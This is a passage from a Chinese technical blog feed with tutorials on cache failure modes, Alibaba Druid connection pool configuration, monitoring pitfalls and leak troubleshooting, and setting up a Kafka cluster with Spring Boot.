        <content type="html"><![CDATA[<p>缓存雪崩，缓存穿透，缓存预热，缓存热备是在做缓存设计或者缓存应用时经常遇到的概念，也是缓存应用过程中必须熟知及知道 的东西。</p><h4 id="缓存雪崩"><a href="#缓存雪崩" class="headerlink" title="缓存雪崩"></a>缓存雪崩</h4><p>当缓存处于单点情况下，一旦缓存服务器崩溃，所有的请求就会落到数据库层，此时，如果由于访问量过大则会导致数据库宕机，进而导致整个网站或服务不可用，这种缓存故障就是俗称的缓存雪崩。</p><p><strong>解决方案</strong>：解决缓存雪崩故障，就得解决单点问题，提高缓存高可用性，建立分布式的高可用缓存系统，一台缓存服务器挂了，另外的一台起来继续工作，更不能影响其他的缓存系统。</p><h4 id="缓存穿透"><a href="#缓存穿透" class="headerlink" title="缓存穿透"></a>缓存穿透</h4><p>如果某个key对应的数据不存在，而又未对该key做缓存，所以每次请求都会穿过缓存直接到数据库进行查询，并发量高的情况下进而导致数据库直接宕机，这就是缓存穿透。</p><p><strong>解决方案</strong>：解决缓存穿透，如果做了缓存就要把null值或者空列表等也要缓存起来。如果是恶意攻击一个不存在的key，在控制层做频率限制是必须的。</p><h4 id="缓存预热"><a href="#缓存预热" class="headerlink" title="缓存预热"></a>缓存预热</h4><p>新的缓存系统没有任何缓存数据，在缓存重建数据的过程中，系统性能和数据库负载都不太好，所以最好是在系统上线之前就把要缓存的热点数据加载到缓存中，这种缓存预加载手段就是缓存预热。</p><h4 id="缓存热备"><a href="#缓存热备" class="headerlink" title="缓存热备"></a>缓存热备</h4><p>缓存热备即当一台缓存服务器不可用时能实时切换到备用缓存服务器，不影响缓存使用。集群模式下，每个主节点都会有一个或多个从节点来当备用，一旦主节点挂点，从节点立即充当主节点使用。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 缓存 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Druid - 目前最好的连接池</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E8%BF%9E%E6%8E%A5%E6%B1%A0/Druid%20-%20%E7%9B%AE%E5%89%8D%E6%9C%80%E5%A5%BD%E7%9A%84%E8%BF%9E%E6%8E%A5%E6%B1%A0/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E8%BF%9E%E6%8E%A5%E6%B1%A0/Druid%20-%20%E7%9B%AE%E5%89%8D%E6%9C%80%E5%A5%BD%E7%9A%84%E8%BF%9E%E6%8E%A5%E6%B1%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="Druid是什么"><a href="#Druid是什么" class="headerlink" title="Druid是什么"></a>Druid是什么</h2><p>Druid是阿里开源的连接池，是Java语言中最好的数据库连接池.Druid能够提供强大的监控和扩展功能，是为监控而生的数据库连接池！</p><blockquote><p>GitHub：<a href="https://github.com/alibaba/druid/">https://github.com/alibaba/druid/</a></p></blockquote><h2 id="添加依赖"><a href="#添加依赖" class="headerlink" title="添加依赖"></a>添加依赖</h2><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;&lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;&lt;artifactId&gt;druid&lt;&#x2F;artifactId&gt;&lt;version&gt;1.1.2&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="参考配置"><a href="#参考配置" class="headerlink" title="参考配置"></a>参考配置</h2><pre class="line-numbers language-none"><code class="language-none">&lt;bean id&#x3D;&quot;dataSource&quot; class&#x3D;&quot;com.alibaba.druid.pool.DruidDataSource&quot; init-method&#x3D;&quot;init&quot; destroy-method&#x3D;&quot;close&quot;&gt;       <!-- 基本属性 url、user、password -->      &lt;property name&#x3D;&quot;url&quot; value&#x3D;&quot;$&#123;jdbc_url&#125;&quot; &#x2F;&gt;      &lt;property name&#x3D;&quot;username&quot; value&#x3D;&quot;$&#123;jdbc_user&#125;&quot; &#x2F;&gt;      &lt;property name&#x3D;&quot;password&quot; value&#x3D;&quot;$&#123;jdbc_password&#125;&quot; &#x2F;&gt;              <!-- 配置初始化大小、最小、最大 -->      &lt;property name&#x3D;&quot;initialSize&quot; value&#x3D;&quot;1&quot; &#x2F;&gt;      &lt;property name&#x3D;&quot;minIdle&quot; value&#x3D;&quot;1&quot; &#x2F;&gt;       &lt;property name&#x3D;&quot;maxActive&quot; value&#x3D;&quot;20&quot; &#x2F;&gt;         <!-- 配置获取连接等待超时的时间 -->      &lt;property name&#x3D;&quot;maxWait&quot; value&#x3D;&quot;60000&quot; &#x2F;&gt;         <!-- 配置间隔多久才进行一次检测，检测需要关闭的空闲连接，单位是毫秒 -->      &lt;property name&#x3D;&quot;timeBetweenEvictionRunsMillis&quot; value&#x3D;&quot;60000&quot; &#x2F;&gt;         <!-- 配置一个连接在池中最小生存的时间，单位是毫秒 -->      &lt;property name&#x3D;&quot;minEvictableIdleTimeMillis&quot; value&#x3D;&quot;300000&quot; &#x2F;&gt;          &lt;property name&#x3D;&quot;validationQuery&quot; value&#x3D;&quot;SELECT &#39;x&#39;&quot; &#x2F;&gt;      &lt;property name&#x3D;&quot;testWhileIdle&quot; value&#x3D;&quot;true&quot; &#x2F;&gt;      &lt;property name&#x3D;&quot;testOnBorrow&quot; value&#x3D;&quot;false&quot; &#x2F;&gt;      &lt;property name&#x3D;&quot;testOnReturn&quot; value&#x3D;&quot;false&quot; &#x2F;&gt;         <!-- 打开PSCache，并且指定每个连接上PSCache的大小 -->      &lt;property name&#x3D;&quot;poolPreparedStatements&quot; value&#x3D;&quot;true&quot; &#x2F;&gt;      &lt;property name&#x3D;&quot;maxPoolPreparedStatementPerConnectionSize&quot; value&#x3D;&quot;20&quot; &#x2F;&gt;         <!-- 配置监控统计拦截的filters -->      &lt;property name&#x3D;&quot;filters&quot; value&#x3D;&quot;stat&quot; &#x2F;&gt; &lt;&#x2F;bean&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通常来说，只需要修改initialSize、minIdle、maxActive。</p><p>如果用Oracle，则把poolPreparedStatements配置为true，mysql可以配置为false。分库分表较多的数据库，建议配置为false。</p><h2 id="连接池监控"><a href="#连接池监控" class="headerlink" title="连接池监控"></a>连接池监控</h2><p>在web.xml中加入以下配置：</p><pre class="line-numbers language-none"><code class="language-none"><!-- Druid连接池监控 -->&lt;servlet&gt;      &lt;servlet-name&gt;DruidStatView&lt;&#x2F;servlet-name&gt;      &lt;servlet-class&gt;com.alibaba.druid.support.http.StatViewServlet&lt;&#x2F;servlet-class&gt;&lt;&#x2F;servlet&gt;  &lt;servlet-mapping&gt;      &lt;servlet-name&gt;DruidStatView&lt;&#x2F;servlet-name&gt;      &lt;url-pattern&gt;&#x2F;druid&#x2F;*&lt;&#x2F;url-pattern&gt;  &lt;&#x2F;servlet-mapping&gt;  &lt;filter&gt;&lt;filter-name&gt;DruidWebStatFilter&lt;&#x2F;filter-name&gt;&lt;filter-class&gt;com.alibaba.druid.support.http.WebStatFilter&lt;&#x2F;filter-class&gt;&lt;init-param&gt;&lt;param-name&gt;exclusions&lt;&#x2F;param-name&gt;&lt;param-value&gt;*.js,*.gif,*.jpg,*.png,*.css,*.ico,&#x2F;druid&#x2F;*&lt;&#x2F;param-value&gt;&lt;&#x2F;init-param&gt;&lt;&#x2F;filter&gt;&lt;filter-mapping&gt;&lt;filter-name&gt;DruidWebStatFilter&lt;&#x2F;filter-name&gt;&lt;url-pattern&gt;&#x2F;*&lt;&#x2F;url-pattern&gt;&lt;&#x2F;filter-mapping&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问localhost:8080&#x2F;project&#x2F;druid即可打开监控页面。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 连接池 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一次 Druid 连接池泄露引发的血案。。</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E8%BF%9E%E6%8E%A5%E6%B1%A0/%E4%B8%80%E6%AC%A1%20Druid%20%E8%BF%9E%E6%8E%A5%E6%B1%A0%E6%B3%84%E9%9C%B2%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88%E3%80%82%E3%80%82/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E8%BF%9E%E6%8E%A5%E6%B1%A0/%E4%B8%80%E6%AC%A1%20Druid%20%E8%BF%9E%E6%8E%A5%E6%B1%A0%E6%B3%84%E9%9C%B2%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88%E3%80%82%E3%80%82/</url>
      
        <content type="html"><![CDATA[<p>最近某个应用程序老是卡，需要重启才能解决问题，导致被各种投诉，排查问题是 Druid 连接池泄露引发的血案。。</p><p><strong>异常日志如下：</strong></p><pre class="line-numbers language-none"><code class="language-none">ERROR - com.alibaba.druid.pool.GetConnectionTimeoutException: wait millis 60000, active 50, maxActive 50, creating 0at com.alibaba.druid.pool.DruidDataSource.getConnectionInternal(DruidDataSource.java:1512)at com.alibaba.druid.pool.DruidDataSource.getConnectionDirect(DruidDataSource.java:1255)at com.alibaba.druid.filter.FilterChainImpl.dataSource_connect(FilterChainImpl.java:5007)at com.alibaba.druid.filter.stat.StatFilter.dataSource_getConnection(StatFilter.java:680)at com.alibaba.druid.filter.FilterChainImpl.dataSource_connect(FilterChainImpl.java:5003)at com.alibaba.druid.pool.DruidDataSource.getConnection(DruidDataSource.java:1233)at com.alibaba.druid.pool.DruidDataSource.getConnection(DruidDataSource.java:1225)at com.alibaba.druid.pool.DruidDataSource.getConnection(DruidDataSource.java:90)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>连接池中的连接数量已经到达最大值了，到了 60 秒还不能创建连接就超时报错了。</p><p>问题很明显，肯定是应用程序哪里用了连接但没有释放，全局排查代码又比较艰难，加了三个 Druid 连接池配置项，最终定位并解决了问题。</p><p><strong>添加以下配置：</strong></p><pre class="line-numbers language-none"><code class="language-none"><!-- 是否打开强制回收连接功能 -->&lt;property name&#x3D;&quot;removeAbandoned&quot; value&#x3D;&quot;true&quot; &#x2F;&gt;<!-- 超时时间，单位：毫秒 -->&lt;property name&#x3D;&quot;removeAbandonedTimeoutMillis&quot; value&#x3D;&quot;600000&quot;&#x2F;&gt;<!-- 连接回收时是否记录日志 -->&lt;property name&#x3D;&quot;logAbandoned&quot; value&#x3D;&quot;true&quot; &#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这就是连接泄露配置项，如果连接长时间不归还，<code>removeAbandoned</code> 打开状态，超过 <code>removeAbandonedTimeoutMillis</code> 设置的超时时间，将会强制回收连接。</p><p>连接池初始化时会启动一个线程，用于检查并回收连接。</p><p>参考源码：</p><blockquote><p>com.alibaba.druid.pool.DruidDataSource#createAndStartDestroyThread</p></blockquote><p>当 <code>logAbandoned</code> 打开状态时，关闭连接同时会记录当时的堆栈日志，可用于定位到哪些代码打开了连接没关闭。</p><pre class="line-numbers language-none"><code class="language-none">abandon connection, owner thread: https-jsse-nio-4443-exec-9, connected at : 1573521883837, open stackTraceat java.lang.Thread.getStackTrace(Thread.java:1589)at com.alibaba.druid.pool.DruidDataSource.getConnectionDirect(DruidDataSource.java:1305)at com.alibaba.druid.filter.FilterChainImpl.dataSource_connect(FilterChainImpl.java:4619)at com.alibaba.druid.filter.stat.StatFilter.dataSource_getConnection(StatFilter.java:680)at com.alibaba.druid.filter.FilterChainImpl.dataSource_connect(FilterChainImpl.java:4615)at com.alibaba.druid.pool.DruidDataSource.getConnection(DruidDataSource.java:1225)at com.alibaba.druid.pool.DruidDataSource.getConnection(DruidDataSource.java:1217)at com.alibaba.druid.pool.DruidDataSource.getConnection(DruidDataSource.java:90)at org.springframework.jdbc.datasource.lookup.AbstractRoutingDataSource.getConnection(AbstractRoutingDataSource.java:162)...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个配置项虽然可用于排查连接池释放问题，但生产环境小心使用，如果有的业务执行事务的时间比较长，会被误回收，小心引发另外一个血案。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 连接池 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阿里 Druid 连接池的坑。。</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E8%BF%9E%E6%8E%A5%E6%B1%A0/%E9%98%BF%E9%87%8C%20Druid%20%E8%BF%9E%E6%8E%A5%E6%B1%A0%E7%9A%84%E5%9D%91%E3%80%82%E3%80%82/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E8%BF%9E%E6%8E%A5%E6%B1%A0/%E9%98%BF%E9%87%8C%20Druid%20%E8%BF%9E%E6%8E%A5%E6%B1%A0%E7%9A%84%E5%9D%91%E3%80%82%E3%80%82/</url>
      
        <content type="html"><![CDATA[<h2 id="Druid的坑"><a href="#Druid的坑" class="headerlink" title="Druid的坑"></a>Druid的坑</h2><p>当查询数据库的Clob转换为Oracle Clob类型的时候。</p><pre class="line-numbers language-none"><code class="language-none">java.lang.ClassCastException: com.alibaba.druid.proxy.jdbc.ClobProxyImpl cannot be cast to oracle.sql.CLOB<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="问题原因"><a href="#问题原因" class="headerlink" title="问题原因"></a>问题原因</h2><p>ClobProxyImpl不能转换为Oracle的Clob字段，这也是醉了。</p><p>原因是Druid为Clob字段增加了代理类：com.alibaba.druid.proxy.jdbc.ClobProxyImpl，然后代码里面强制转换成Oracle的Clob就出现了这个问题。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>现在的解决方案是先转换为Druid的代理类ClobProxy对象，然后获取原生的Oracle Clob字段内容即可。</p><pre class="line-numbers language-none"><code class="language-none">public class ClobUtil &#123;public static CLOB parseOracleClob(Clob clob) &#123;SerializableClob sclob &#x3D; (SerializableClob) clob;Clob wrappedClob &#x3D; sclob.getWrappedClob();&#x2F;&#x2F; 解决Druid的坑if (wrappedClob instanceof ClobProxy) &#123;ClobProxy clobProxy &#x3D; (ClobProxy) wrappedClob;wrappedClob &#x3D; clobProxy.getRawClob();&#125;return (CLOB) wrappedClob;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 连接池 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阿里 Druid 连接池监控的两个坑</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E8%BF%9E%E6%8E%A5%E6%B1%A0/%E9%98%BF%E9%87%8C%20Druid%20%E8%BF%9E%E6%8E%A5%E6%B1%A0%E7%9B%91%E6%8E%A7%E7%9A%84%E4%B8%A4%E4%B8%AA%E5%9D%91/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E8%BF%9E%E6%8E%A5%E6%B1%A0/%E9%98%BF%E9%87%8C%20Druid%20%E8%BF%9E%E6%8E%A5%E6%B1%A0%E7%9B%91%E6%8E%A7%E7%9A%84%E4%B8%A4%E4%B8%AA%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/18-2-4/38258738.jpg" alt="image"></p><p>阿里的Druid大家都知道是最好的连接池，其强大的监控功能是我们追求的重要特性。但在实际情况中也有不少坑，说下最近遇到的一个坑吧！</p><h4 id="问题1：不断打印error级别的错误日志"><a href="#问题1：不断打印error级别的错误日志" class="headerlink" title="问题1：不断打印error级别的错误日志"></a>问题1：不断打印error级别的错误日志</h4><blockquote><p>session ip change too many</p></blockquote><p><strong>下面是其报错的关键源码</strong></p><blockquote><p>com.alibaba.druid.support.http.stat.WebSessionStat#addRemoteAddress</p></blockquote><pre class="line-numbers language-none"><code class="language-none">public void addRemoteAddress(String ip) &#123;    if (remoteAddresses &#x3D;&#x3D; null) &#123;        this.remoteAddresses &#x3D; ip;        return;    &#125;    if (remoteAddresses.contains(ip)) &#123;        return;    &#125;    if (remoteAddresses.length() &gt; 256) &#123;        LOG.error(&quot;session ip change too many&quot;);        return;    &#125;    remoteAddresses +&#x3D; &#39;;&#39; + ip;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>再来看看Druid连接池获取IP的方式</strong></p><blockquote><p>com.alibaba.druid.util.DruidWebUtils</p></blockquote><pre class="line-numbers language-none"><code class="language-none">public static String getRemoteAddr(HttpServletRequest request) &#123;    String ip &#x3D; request.getHeader(&quot;x-forwarded-for&quot;);    if (ip &#x3D;&#x3D; null || ip.length() &#x3D;&#x3D; 0 || &quot;unknown&quot;.equalsIgnoreCase(ip)) &#123;        ip &#x3D; request.getHeader(&quot;Proxy-Client-IP&quot;);    &#125;    if (ip &#x3D;&#x3D; null || ip.length() &#x3D;&#x3D; 0 || &quot;unknown&quot;.equalsIgnoreCase(ip)) &#123;        ip &#x3D; request.getHeader(&quot;WL-Proxy-Client-IP&quot;);    &#125;    if (ip &#x3D;&#x3D; null || ip.length() &#x3D;&#x3D; 0 || &quot;unknown&quot;.equalsIgnoreCase(ip)) &#123;        ip &#x3D; request.getRemoteAddr();    &#125;    return ip;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>分析其源码</strong></p><p>这是阿里Druid连接池的session监控功能，会记录同一个会话ID的所有访问IP记录，当超过256个字符长度时就会打印这个错误日志，但实际功能不受影响。</p><p>看了下Druid session监控的页面，同一个会话请求次数并不多，但记录的IP却有问题，一个请求最多的会保存多级代理形成的多段IP（如192.168.1.2,192.168.1.3,192.168.1.4），这样一来5、6次请求就会使访问IP超出256长度从而打印这个错误。</p><p><strong>解决方案</strong></p><p>1、如果用不到session监控，就关闭此功能；</p><blockquote><p><a href="https://github.com/alibaba/druid/wiki/%E9%85%8D%E7%BD%AE_%E9%85%8D%E7%BD%AEWebStatFilter">https://github.com/alibaba/druid/wiki/%E9%85%8D%E7%BD%AE_%E9%85%8D%E7%BD%AEWebStatFilter</a></p></blockquote><pre class="line-numbers language-none"><code class="language-none">&lt;init-param&gt;  &lt;param-name&gt;sessionStatEnable&lt;&#x2F;param-name&gt;  &lt;param-value&gt;false&lt;&#x2F;param-value&gt;&lt;&#x2F;init-param&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>2、修改源码，如果有多段IP，截取第一段，并修改记录访问IP（256位）的长度；</p><p>作者去看了阿里最新的包，此问题还存在。</p><p><img src="http://img.javastack.cn/18-1-29/92452744.jpg"></p><p>并且Github上的Druid官方错误申报里面也有同样的问题，阿里也没有修复的意思，所以我们已暂时关闭session监控功能。</p><h4 id="问题2：DruidStatView类异常"><a href="#问题2：DruidStatView类异常" class="headerlink" title="问题2：DruidStatView类异常"></a>问题2：DruidStatView类异常</h4><pre class="line-numbers language-none"><code class="language-none">java.util.ConcurrentModificationException    at java.util.LinkedHashMap$LinkedHashIterator.nextEntry(LinkedHashMap.java:394)    at java.util.LinkedHashMap$ValueIterator.next(LinkedHashMap.java:409)    at java.util.Collections$UnmodifiableCollection$1.next(Collections.java:1067)    at com.alibaba.druid.support.http.stat.WebAppStat.getSessionStatDataList(WebAppStat.java:504)    at com.alibaba.druid.support.http.stat.WebAppStatUtils.getSessionStatDataList(WebAppStatUtils.java:64)    at com.alibaba.druid.support.http.stat.WebAppStatManager.getSessionStatData(WebAppStatManager.java:100)    at com.alibaba.druid.stat.DruidStatService.getWebSessionStatDataList(DruidStatService.java:205)    at com.alibaba.druid.stat.DruidStatService.service(DruidStatService.java:161)    at com.alibaba.druid.support.http.StatViewServlet.process(StatViewServlet.java:162)    at com.alibaba.druid.support.http.ResourceServlet.service(ResourceServlet.java:253)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>看源码，发现又是session监控的坑</strong></p><p>无力吐槽。。</p><p><img src="http://img.javastack.cn/18-1-29/83615861.jpg"></p><p>for循环里面重复定义Map，可能在别的地方有元素变动，导致发生ConcurrentModificationException异常。</p><p>所以，最后关闭了session监控。</p><p>很好奇，阿里工程师都这种水平吗？<br>还是为了偷懒？</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 连接池 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot &amp; Kafka 实战</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/Kafka/Spring%20Boot%20&amp;%20Kafka%20%E5%AE%9E%E6%88%98/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/Kafka/Spring%20Boot%20&amp;%20Kafka%20%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<h3 id="Kafka集群安装、配置和启动"><a href="#Kafka集群安装、配置和启动" class="headerlink" title="Kafka集群安装、配置和启动"></a>Kafka集群安装、配置和启动</h3><p>Kafka需要依赖zookeeper，并且自身集成了zookeeper，zookeeper至少需要3个节点保证集群高可用，下面是在单机linux下创建kafka3个节点伪集群模式。</p><p><strong>1、下载包</strong></p><blockquote><p>下载地址：<a href="http://kafka.apache.org/downloads">http://kafka.apache.org/downloads</a></p></blockquote><p><strong>2、解压包</strong></p><blockquote><p>tar -zxvf kafka_2.11-1.0.0.tgz<br>mv kafka_2.11-1.0.0 kafka1<br>mv kafka_2.11-1.0.0 kafka2<br>mv kafka_2.11-1.0.0 kafka3</p></blockquote><p><strong>3、创建ZK集群</strong></p><p>修改ZK配置文件：kafka1-3&#x2F;config&#x2F;zookeeper.properties分别修改对应的参数。</p><pre class="line-numbers language-none"><code class="language-none">dataDir&#x3D;&#x2F;usr&#x2F;local&#x2F;kafka&#x2F;zookeeper1dataLogDir&#x3D;&#x2F;usr&#x2F;local&#x2F;kafka&#x2F;zookeeper&#x2F;logclientPort&#x3D;2181maxClientCnxns&#x3D;0tickTime&#x3D;2000initLimit&#x3D;100syncLimit&#x3D;5server.1&#x3D;127.0.0.1:2888:3888server.2&#x3D;127.0.0.1:4888:5888server.3&#x3D;127.0.0.1:6888:7888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&#x2F;usr&#x2F;local&#x2F;kafka&#x2F;zookeeper1-3目录下分别创建myid文件，内容对应1~3</p><p>启动ZK，分别进行Kafka1-3目录:</p><blockquote><p>bin&#x2F;zookeeper-server-start.sh config&#x2F;zookeeper.properties &amp;</p></blockquote><p>启动报文件失败，需要手动创建文件目录并赋予对应的权限。</p><p><strong>4、创建Kafka集群</strong></p><p>配置文件：kafka1-3&#x2F;config&#x2F;server.properties分别修改对应的参数。</p><pre class="line-numbers language-none"><code class="language-none">broker.id&#x3D;1 zookeeper.connect&#x3D;localhost:2181,localhost:2182,localhost:2183listeners&#x3D;PLAINTEXT:&#x2F;&#x2F;192.168.12.11:9091 log.dirs&#x3D;&#x2F;tmp&#x2F;kafka-logs-1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>启动Kafka，分别进行Kafka1-3目录:</p><blockquote><p>bin&#x2F;kafka-server-start.sh config&#x2F;server.properties &amp;</p></blockquote><p>启动报文件失败，需要手动创建文件目录并赋予对应的权限。</p><p><strong>5、集群测试</strong></p><p>在kafka1上面发送消息：</p><blockquote><p>bin&#x2F;kafka-console-producer.sh –broker-list localhost:9091 –topic test </p></blockquote><p>在kafka2、kafka3消费消息：</p><blockquote><p>bin&#x2F;kafka-console-consumer.sh –zookeeper localhost:2181 –from-beginning –topic my-replicated-topic</p></blockquote><h3 id="Spring-Boot-集成-Kafka-实战"><a href="#Spring-Boot-集成-Kafka-实战" class="headerlink" title="Spring Boot 集成 Kafka 实战"></a>Spring Boot 集成 Kafka 实战</h3><p><strong>1、添加spring-kafka依赖</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;spring-kafka.version&gt;2.1.0.RELEASE&lt;&#x2F;spring-kafka.version&gt;<!-- spring-kafka-->&lt;dependency&gt;    &lt;groupId&gt;org.springframework.kafka&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;spring-kafka&lt;&#x2F;artifactId&gt;    &lt;version&gt;$&#123;spring-kafka.version&#125;&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>2、添加Spring Boot的自动配置</strong></p><p>自动配置类：</p><blockquote><p>org.springframework.boot.autoconfigure.kafka.KafkaAutoConfiguration</p></blockquote><p>配置属性类：</p><blockquote><p>org.springframework.boot.autoconfigure.kafka.KafkaProperties</p></blockquote><pre class="line-numbers language-none"><code class="language-none">Spring:  kafka:    bootstrap-servers:      - 192.168.101.137:9091      - 192.168.101.137:9092      - 192.168.101.137:9093    producer:      retries: 0      batch-size: 16384      buffer-memory: 33554432      key-serializer: org.apache.kafka.common.serialization.StringSerializer      value-serializer: org.apache.kafka.common.serialization.StringSerializer    consumer:      group-id: foo      auto-offset-reset: earliest      enable-auto-commit: true      auto-commit-interval: 100      key-deserializer: org.apache.kafka.common.serialization.StringDeserializer      value-deserializer: org.apache.kafka.common.serialization.StringDeserializer<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>3、发送消息</strong></p><pre class="line-numbers language-none"><code class="language-none">@Autowiredprivate KafkaTemplate kafkaTemplate;@GetMapping(&quot;&#x2F;send&quot;)public Object send(String msg) &#123;kafkaTemplate.send(&quot;test&quot;, &quot;name&quot;, msg);return &quot;send ok&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>4、接收消息</strong></p><p>在任何bean里面，添加@KafkaListener，支持消息接收。</p><pre class="line-numbers language-none"><code class="language-none">@KafkaListener(topics &#x3D; &quot;test&quot;)public void processMessage(String content) &#123;logger.info(&quot;收到消息, topic:test, msg:&#123;&#125;&quot;, content);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>5、参考资料</strong></p><p>Spring Boot &amp; Kafka官方文档：</p><blockquote><p><a href="https://docs.spring.io/spring-boot/docs/current-SNAPSHOT/reference/htmlsingle/#boot-features-kafka">https://docs.spring.io/spring-boot/docs/current-SNAPSHOT/reference/htmlsingle/#boot-features-kafka</a></p></blockquote><p>Spring for Apache Kafka官方文档：</p><blockquote><p><a href="https://docs.spring.io/spring-kafka/reference/htmlsingle/">https://docs.spring.io/spring-kafka/reference/htmlsingle/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kafka </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>告诉你，Kafka 是个牛逼货！</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/Kafka/%E5%91%8A%E8%AF%89%E4%BD%A0%EF%BC%8CKafka%20%E6%98%AF%E4%B8%AA%E7%89%9B%E9%80%BC%E8%B4%A7%EF%BC%81/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/Kafka/%E5%91%8A%E8%AF%89%E4%BD%A0%EF%BC%8CKafka%20%E6%98%AF%E4%B8%AA%E7%89%9B%E9%80%BC%E8%B4%A7%EF%BC%81/</url>
      
